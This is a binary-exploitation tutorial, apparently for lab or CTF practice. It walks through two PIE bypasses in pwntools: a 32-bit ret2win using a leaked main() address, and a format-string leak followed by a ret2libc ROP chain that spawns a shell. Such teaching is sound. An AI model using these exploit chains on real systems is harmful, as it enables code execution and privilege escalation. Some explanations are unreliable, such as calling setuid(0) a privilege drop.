### **PIE Bypass Exploit Walkthrough (32-bit)**

In this example, we are exploiting a **Position Independent Executable (PIE)** that is vulnerable to a **buffer overflow**. The key vulnerability here is that the address of the `main()` function is leaked, allowing us to calculate the base address of the binary. From there, we can determine the address of the `win()` function and call it to bypass PIE protection.

---

### **Vulnerability Breakdown**:
1. **PIE Enabled**: PIE (Position Independent Executable) randomizes the binary's base address, making it difficult to predict the location of functions and buffers. However, a leaked address allows us to calculate the base address.
2. **Format String Vulnerability**: The `printf` function prints the address of `main()`, which we can use to determine the base address of the binary.
3. **Buffer Overflow**: The buffer overflow occurs because we can overwrite the return address of the `vuln()` function and redirect the control flow to the `win()` function.

---

### **Step-by-Step Exploitation**:

1. **Leaking the Address of `main()`**:
   - In the `vuln()` function, the address of `main()` is printed using `printf("Main Function is at: %lx\n", main);`.
   - The program then uses `gets(buffer)` to accept user input, which causes the overflow. The address of `main` is printed before this, so we can leak it and use it to determine the base address of the binary.

2. **Calculating the Binary Base**:
   - After obtaining the leaked address of `main`, we can calculate the **base address of the binary**. Since the address of `main` is known to be `elf.sym['main']` (an offset from the binary base), we can subtract this offset from the leaked address:
   
   ```python
   elf.address = main - elf.sym['main']
   ```

3. **Constructing the ROP Payload**:
   - Now that we know the binary's base address, we can calculate the address of the `win()` function using `elf.sym['win']`, which will now return the absolute address of `win()` in memory.
   - We then create a payload that fills the buffer with `A` characters (to overflow the return address) and appends the address of `win()` at the end to redirect the execution flow.

4. **Sending the Payload**:
   - Finally, we send the crafted payload to the vulnerable program, and upon execution, the program will jump to `win()`, which prints the success message `PIE bypassed! Great job :D`.

---

### **Exploit Code**:

```python
from pwn import *

# Load the binary
elf = context.binary = ELF('./vuln-32')
p = process()

# Leak the address of main()
p.recvuntil('at: ')
main = int(p.recvline(), 16)

# Calculate the base address of the binary
elf.address = main - elf.sym['main']

# Construct the payload
payload = b'A' * 32  # Buffer overflow to reach return address
payload += p32(elf.sym['win'])  # Address of the win function

# Send the payload
p.sendline(payload)

# Receive and print the output
print(p.clean().decode('latin-1'))
```

### **Explanation of Key Lines**:

1. **Leak the Address of `main()`**:
   ```python
   p.recvuntil('at: ')
   main = int(p.recvline(), 16)
   ```
   This receives the printed address of `main()` and converts it from a string to an integer (in hexadecimal format).

2. **Calculate the Base Address of the Binary**:
   ```python
   elf.address = main - elf.sym['main']
   ```
   Subtracting the offset of `main()` from the leaked address gives us the base address of the binary.

3. **Buffer Overflow to Call `win()`**:
   ```python
   payload = b'A' * 32
   payload += p32(elf.sym['win'])
   ```
   Here, we overflow the buffer with `32` `A` characters (adjusting this value based on the buffer size) and append the address of `win()` to the payload to overwrite the return address.

4. **Send the Payload**:
   ```python
   p.sendline(payload)
   ```
   This sends the payload to the vulnerable program.

---

### **Test Output**:

```bash
$ ./vuln-32
Main Function is at: 0x5655d1b9
PIE bypassed! Great job :D
```

---

### **Summary**:
This exploit demonstrates how a **leaked address of a function** (in this case, `main()`) can be used to bypass **PIE protection** in a 32-bit binary. By calculating the base address of the binary from the leaked `main()` address, we can determine the address of `win()` and exploit a buffer overflow to call it. Despite **PIE** being enabled, this vulnerability allows us to bypass the protection with a simple leak and basic buffer overflow.



## **PIE Bypass by leaking addresses**

This example demonstrates how to bypass **Position Independent Executable (PIE)** protection by leveraging a **stack buffer overflow** to leak the address of a function in the **PIE binary**. The leak is then used to determine the **PIE base address**, which is crucial for **ret2libc** exploits.

#### **Steps in the Exploit:**

1. **Leaking an Address**: The main technique is to leak the address of a function or variable from the binary. In this case, the address of the `puts` function is leaked by using a **format string vulnerability** in the `enter_name()` function. This is achieved by sending a format string `%15$p` to retrieve the 15th entry in the stack (which corresponds to the address of `puts`).

2. **Calculating PIE Base**: Once the address of `puts` is leaked, it is used to calculate the **PIE base address**. Since PIE randomizes the location of the binary, the leaked address will be offset from the base address of the binary. By subtracting the known offset of `puts` from the leaked address, we can derive the PIE base.

   ```python
   elf.address = leaked_addr - 0x1224
   ```

3. **ROP Chain Construction**: After determining the PIE base, we use **ROP (Return-Oriented Programming)** to craft an exploit. First, a **ROP chain** is created to leak the address of the `puts` function from the **Global Offset Table (GOT)**. Then, the leaked `puts` address is used to calculate the **libc base**.

4. **Subsequent ROP Payload**: With the **libc base address** determined, we can then craft another ROP chain to call the `system()` function in libc and pass the address of the string `/bin/sh` to spawn a shell.

5. **Executing the Payload**: Finally, the crafted payload is sent to the vulnerable binary, and the program will execute the `system("/bin/sh")` function, giving the attacker a **shell**.

---

### **Code Walkthrough:**

```python
# Leak the 15th address from the stack to find PIE base
io.sendlineafter(b':', '%{}$p'.format(15), 16)
io.recvuntil(b'Hello ')  # Skips to the address part
leaked_addr = int(io.recvline(), 16)  # Leaked address of puts
info("leaked_address: %#x", leaked_addr)

# Calculate the PIE base by subtracting the known offset of 'puts'
elf.address = leaked_addr - 0x1224
info("piebase: %#x", elf.address)

# Craft a ROP chain to leak the GOT entry for puts
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.vuln()  # Return to vuln() after puts leak

# Send the crafted payload
io.sendlineafter(b':P', flat({offset: rop.chain()}))
io.recvlines(2)  # Read the leak and blank line

# Retrieve and calculate libc base using the leaked GOT address of puts
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Craft the final ROP chain to call system("/bin/sh")
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(flat({offset: rop.chain()}))

# Get a shell
io.interactive()
```

---

### **Key Concepts in the Exploit**:
1. **Format String Vulnerability**: Used to leak the address of `puts` in the stack.
2. **PIE**: The binary's base address is randomized, making direct address manipulation challenging. However, with a leak, you can calculate the base and bypass PIE.
3. **ROP (Return-Oriented Programming)**: Used to chain multiple function calls (e.g., `puts`, `system`) to perform the exploit.
4. **Libc Leak**: The address of a libc function (`puts` in this case) is used to calculate the base address of libc.
5. **Privilege Escalation**: The program uses `setuid(0)` and `setgid(0)` to drop privileges, but after bypassing PIE and leaking libc, you gain a shell.

---

### **Conclusion**:
This technique demonstrates how to bypass **PIE** protection in a 64-bit binary, use **ROP chains** to leak critical addresses, and finally escalate privileges by calling `system("/bin/sh")`. By leaking function addresses, calculating the PIE and libc base addresses, and chaining **ROP gadgets**, the attacker can execute arbitrary code and gain shell access.